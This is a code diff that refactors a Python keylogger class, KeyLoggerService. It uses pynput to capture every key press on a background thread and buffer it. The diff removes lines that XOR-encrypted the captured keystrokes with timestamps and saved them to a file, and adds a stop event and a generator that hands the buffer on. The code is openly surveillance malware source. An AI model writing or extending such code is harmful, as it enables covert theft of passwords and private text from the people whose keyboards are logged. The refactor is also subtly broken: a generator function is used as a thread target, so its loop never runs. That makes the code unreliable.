@@ -1,33 +1,25 @@
 import time
 from datetime import datetime
 from pynput import keyboard
-from file_writer import FileWriter
 import threading
 from encrypt import Encryption
 
 
 class KeyLoggerService:
 
-    def __init__(self,run_time):
+    def __init__(self):
         self.keyboard_listener = None
         self.key_buffer = []
         self.lock = threading.Lock()
-        self.run_time = run_time
-        self.encryption = Encryption()
+        self.stop_event = threading.Event()
 
-
-    def start_monitoring(self):
-
+    def start_listener(self):
         self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
         self.keyboard_listener.start()
 
-        self.timer_thread = threading.Timer(self.run_time * 60, self.stop_listener)
-        self.timer_thread.start()
-
-        self.send_every_minute()
-
-        self.keyboard_listener.join()
-
+        self.sent_thread = threading.Thread(target=self.send_every_minute)
+        self.sent_thread.start()
+    
 
     def on_key_press(self, key):
         with self.lock:
@@ -40,22 +32,19 @@ class KeyLoggerService:
                 print('Error: ', e)
 
     def send_every_minute(self):
-
-        for i in range(self.run_time):
+        while not self.stop_event.is_set():  
             time.sleep(60)
             with self.lock:
                 buffer = self.key_buffer.copy()
                 if buffer:
                     self.clean_buffer()
-                    time_ = datetime.now().strftime('%H:%M:%S')
-                    time_day_ = datetime.now().strftime('%Y-%m-%d')
-                    buffer.append(time_)
-                    buffer.append(time_day_)
-                    encrypted_data = self.encryption.xor_encryption(''.join(buffer))
-                    FileWriter([encrypted_data])
+                    yield buffer
 
     def stop_listener(self):
+        self.stop_event.set()
         self.keyboard_listener.stop()
+        self.sent_thread.join()
+
 
     def clean_buffer(self):
         self.key_buffer = []
